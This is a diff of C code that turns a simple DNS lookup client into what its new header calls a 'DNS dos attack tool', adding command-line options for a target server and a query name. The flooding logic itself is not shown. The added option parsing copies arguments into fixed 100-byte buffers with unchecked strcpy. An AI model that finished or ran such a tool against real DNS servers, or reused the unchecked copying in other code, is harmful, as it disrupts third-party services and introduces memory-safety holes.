@@ -1,11 +1,15 @@
-//Header Files
-#include<stdio.h>	//printf
-#include<string.h>	//strlen
-#include<stdlib.h>	//malloc
-#include<sys/socket.h>	//you know what this is for
-#include<arpa/inet.h>	//inet_addr , inet_ntoa , ntohs etc
+/**********************************
+ * DNS fuck : DNS dos attack tool 
+ * Creation date : 2012/12/14     
+ * Written by Kousuke Simofuji    
+ *********************************/
+#include<stdio.h>
+#include<string.h>
+#include<stdlib.h>
+#include<sys/socket.h>
+#include<arpa/inet.h>
 #include<netinet/in.h>
-#include<unistd.h>	//getpid
+#include<unistd.h>
 
 #define T_A 1 //Ipv4 address
 #define T_NS 2 //Nameserver
@@ -14,7 +18,7 @@
 #define T_PTR 12 /* domain name pointer */
 #define T_MX 15 //Mail server
 
-//プロトタイプ宣言が必要
+//prototype 
 void ngethostbyname (unsigned char*, unsigned char* , int);
 void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
 
@@ -77,15 +81,26 @@ typedef struct
 
 int main( int argc , char *argv[])
 {
+    int opts;
     unsigned char dns_server[100];
 	unsigned char hostname[100];
 
-	//Get the hostname from the terminal
-    printf("Enter to use DNS Server  : ");
-	scanf("%s" , dns_server);
-	printf("Enter Hostname to Lookup : ");
-	scanf("%s" , hostname);
-	
+    //Parse options
+    while((opts=getopt(argc, argv, "t:q:")) != -1){
+       switch(opts){
+          case 't':
+             strcpy(dns_server, optarg);
+             break;
+          case 'q':
+             strcpy(hostname, optarg);
+             break;
+          default:
+             fprintf(stderr, "Unknow option %c\n", opts);
+             exit(0);
+             break;
+       }
+    }
+
 	//Now get the ip of this hostname , A record
     //hostnameに対してAレコードで引く
     ngethostbyname(dns_server, hostname , T_A);
@@ -100,6 +115,7 @@ void ngethostbyname(unsigned char *dns_server, unsigned char *host , int query_t
 {
 	unsigned char buf[65536],*qname,*reader;
 	int i , j , stop , s;
+    int count = 0;
 
 	struct sockaddr_in a;
 
